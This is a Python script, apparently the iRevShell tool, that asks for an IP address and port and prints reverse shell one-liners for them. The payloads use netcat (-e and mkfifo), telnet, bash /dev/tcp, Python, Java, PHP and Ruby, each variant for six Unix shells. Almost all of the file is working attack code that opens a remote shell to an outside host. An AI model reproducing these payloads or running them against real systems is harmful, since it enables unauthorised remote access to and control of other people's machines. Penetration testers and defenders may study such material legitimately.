# -*- coding: utf-8 -*-
#!/usr/bin/env python3

import socket as so
import psutil as ps
import re

ibanner = """
  _ _____             _____ _    _      _ _ 
 (_)  __ \           / ____| |  | |    | | |
  _| |__) |_____   _| (___ | |__| | ___| | |
 | |  _  // _ \ \ / /\___ \|  __  |/ _ \ | |
 | | | \ \  __/\ V / ____) | |  | |  __/ | |
 |_|_|  \_\___| \_/ |_____/|_|  |_|\___|_|_|
"""
ic = "************\n@IhsanSencan / ihsan.net\ngithub.com/ihsansencan/iRevShell\n************"

def get_ip_addresses(family):
    for interface, snics in ps.net_if_addrs().items():
        for snic in snics:
            if snic.family == family:
                yield (interface, snic.address)

ipv4s = list(get_ip_addresses(so.AF_INET))
# ipv6s = list(get_ip_addresses(so.AF_INET6))

print(f"\033[33m\033[1m{ibanner}\033[0m")
print(f"\033[97m\033[1m{ic}\033[0m")
for i in ipv4s:
    print(f"\033[33m\033[1m{i[0]}: {i[1]}\033[0m")

while True:
    ipver = str(input("************\nIp Adres: "))
    if re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', ipver):
        break
    else:
        print("\033[91m\033[1mCheck the IP address !\x1b[0m")
        continue

while True:
    port = input("Port: ")
    if re.match(r'^([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port):
            break
    else:
        print("\033[91m\033[1mCheck the port !\x1b[0m")
        continue

shells = {'sh': '/bin/sh','bash': '/bin/bash','zsh': '/bin/zsh','ksh': '/bin/ksh','tcsh': '/bin/tcsh','dash': '/bin/dash'}
print(f"************")

def ncPlain():
    print(f"1- Sh\n\033[33m\033[1mnc -e {shells['sh']} {ipver} {port}\033[0m")
    print(f"2- Bash\n\033[33m\033[1mnc -e {shells['bash']} {ipver} {port}\033[0m")
    print(f"3- Zsh\n\033[33m\033[1mnc -e {shells['zsh']} {ipver} {port}\033[0m")
    print(f"4- Ksh\n\033[33m\033[1mnc -e {shells['ksh']} {ipver} {port}\033[0m")
    print(f"5- Tcsh\n\033[33m\033[1mnc -e {shells['tcsh']} {ipver} {port}\033[0m")
    print(f"6- Dash\n\033[33m\033[1mnc -e {shells['dash']} {ipver} {port}\033[0m")
    return

def ncMkfifo():
    print(f"1- Sh\n\033[33m\033[1mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shells['sh']} -i 2>&1|nc {ipver} {port} >/tmp/f\033[0m")
    print(f"2- Bash\n\033[33m\033[1mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shells['bash']} -i 2>&1|nc {ipver} {port} >/tmp/f\033[0m")
    print(f"3- Zsh\n\033[33m\033[1mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shells['zsh']} -i 2>&1|nc {ipver} {port} >/tmp/f\033[0m")
    print(f"4- Ksh\n\033[33m\033[1mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shells['ksh']} -i 2>&1|nc {ipver} {port} >/tmp/f\033[0m")
    print(f"5- Tcsh\n\033[33m\033[1mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shells['tcsh']} -i 2>&1|nc {ipver} {port} >/tmp/f\033[0m")
    print(f"6- Dash\n\033[33m\033[1mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shells['dash']} -i 2>&1|nc {ipver} {port} >/tmp/f\033[0m")
    return

def telNet():
    print(f"1- Telnet\n\033[33m\033[1mrm -f /tmp/p; mknod /tmp/p p && telnet {ipver} {port} 0/tmp/p\033[0m")
    return

def baSh():
    print(f"1- Bash\n\033[33m\033[1mbash -i >& /dev/tcp/{ipver}/{port} 0>&1\033[0m")
    return

def pytHon():
    print(f"""1- Sh\n\033[33m\033[1mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipver}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["{shells['sh']}","-i"]);'\033[0m""")
    print(f"""2- Bash\n\033[33m\033[1mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipver}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["{shells['bash']}","-i"]);'\033[0m""")
    print(f"""3- Zsh\n\033[33m\033[1mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipver}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["{shells['zsh']}","-i"]);'\033[0m""")
    print(f"""4- Ksh\n\033[33m\033[1mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipver}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["{shells['ksh']}","-i"]);'\033[0m""")
    print(f"""5- Tcsh\n\033[33m\033[1mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipver}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["{shells['tcsh']}","-i"]);'\033[0m""")
    print(f"""6- Dash\n\033[33m\033[1mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ipver}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["{shells['dash']}","-i"]);'\033[0m""")
    return

def jaVa():
    print(f"""1- Sh\n\033[33m\033[1mr = Runtime.getRuntime()p = r.exec(["{shells['sh']}","-c","exec 5<>/dev/tcp/{ipver}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()\033[0m""")
    print(f"""2- Bash\n\033[33m\033[1mr = Runtime.getRuntime()p = r.exec(["{shells['bash']}","-c","exec 5<>/dev/tcp/{ipver}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()\033[0m""")
    print(f"""3- Zsh\n\033[33m\033[1mr = Runtime.getRuntime()p = r.exec(["{shells['zsh']}","-c","exec 5<>/dev/tcp/{ipver}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()\033[0m""")
    print(f"""4- Ksh\n\033[33m\033[1mr = Runtime.getRuntime()p = r.exec(["{shells['ksh']}","-c","exec 5<>/dev/tcp/{ipver}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()\033[0m""")
    print(f"""5- Tcsh\n\033[33m\033[1mr = Runtime.getRuntime()p = r.exec(["{shells['tcsh']}","-c","exec 5<>/dev/tcp/{ipver}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()\033[0m""")
    print(f"""6- Dash\n\033[33m\033[1mr = Runtime.getRuntime()p = r.exec(["{shells['dash']}","-c","exec 5<>/dev/tcp/{ipver}/{port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()\033[0m""")
    return

def phP():
    print(f"""1- Sh\n\033[33m\033[1mphp -r '$sock=fsockopen("{ipver}",{port});exec("{shells['sh']} -i <&3 >&3 2>&3");'\033[0m""")
    print(f"""2- Bash\n\033[33m\033[1mphp -r '$sock=fsockopen("{ipver}",{port});exec("{shells['bash']} -i <&3 >&3 2>&3");'\033[0m""")
    print(f"""3- Zsh\n\033[33m\033[1mphp -r '$sock=fsockopen("{ipver}",{port});exec("{shells['zsh']} -i <&3 >&3 2>&3");'\033[0m""")
    print(f"""4- Ksh\n\033[33m\033[1mphp -r '$sock=fsockopen("{ipver}",{port});exec("{shells['ksh']} -i <&3 >&3 2>&3");'\033[0m""")
    print(f"""5- Tcsh\n\033[33m\033[1mphp -r '$sock=fsockopen("{ipver}",{port});exec("{shells['tcsh']} -i <&3 >&3 2>&3");'\033[0m""")
    print(f"""6- Dash\n\033[33m\033[1mphp -r '$sock=fsockopen("{ipver}",{port});exec("{shells['dash']} -i <&3 >&3 2>&3");'\033[0m""")
    return

def ruBy():
    print(f"""1- Sh\n\033[33m\033[1mruby -rsocket -e 'f=TCPSocket.open("{ipver}",{port}).to_i;exec sprintf("{shells['sh']} -i <&%d >&%d 2>&%d",f,f,f)'\033[0m""")
    print(f"""2- Bash\n\033[33m\033[1mruby -rsocket -e 'f=TCPSocket.open("{ipver}",{port}).to_i;exec sprintf("{shells['bash']} -i <&%d >&%d 2>&%d",f,f,f)'\033[0m""")
    print(f"""3- Zsh\n\033[33m\033[1mruby -rsocket -e 'f=TCPSocket.open("{ipver}",{port}).to_i;exec sprintf("{shells['zsh']} -i <&%d >&%d 2>&%d",f,f,f)'\033[0m""")
    print(f"""4- Ksh\n\033[33m\033[1mruby -rsocket -e 'f=TCPSocket.open("{ipver}",{port}).to_i;exec sprintf("{shells['ksh']} -i <&%d >&%d 2>&%d",f,f,f)'\033[0m""")
    print(f"""5- Tcsh\n\033[33m\033[1mruby -rsocket -e 'f=TCPSocket.open("{ipver}",{port}).to_i;exec sprintf("{shells['tcsh']} -i <&%d >&%d 2>&%d",f,f,f)'\033[0m""")
    print(f"""6- Dash\n\033[33m\033[1mruby -rsocket -e 'f=TCPSocket.open("{ipver}",{port}).to_i;exec sprintf("{shells['dash']} -i <&%d >&%d 2>&%d",f,f,f)'\033[0m""")
    return
try:
    while True:
        sType = input(f"\033[97m\033[1m1- Nc plain\n2- Nc mkfifo\n3- Telnet\n4- Bash\n5- Python\n6- Java\n7- Php\n8- Ruby\n9- Powershell\033[0m\n\033[91m\033[1m0- Exit\033[0m\nSelected: ")

        if sType == "0":
            break
        else:
            if sType == "1":
                ncPlain()
            elif sType == "2":
                ncMkfifo()
            elif sType == "3":
                telNet()
            elif sType == "4":
                baSh()
            elif sType == "5":
                pytHon()
            elif sType == "6":
                jaVa()
            elif sType == "7":
                phP()
            elif sType == "8":
                ruBy()
            elif sType == "9":
                pass
            else:
                print(f"\033[91m\033[1mWrong choice!\033[0m".center(40,'*'))
except KeyboardInterrupt:
    pass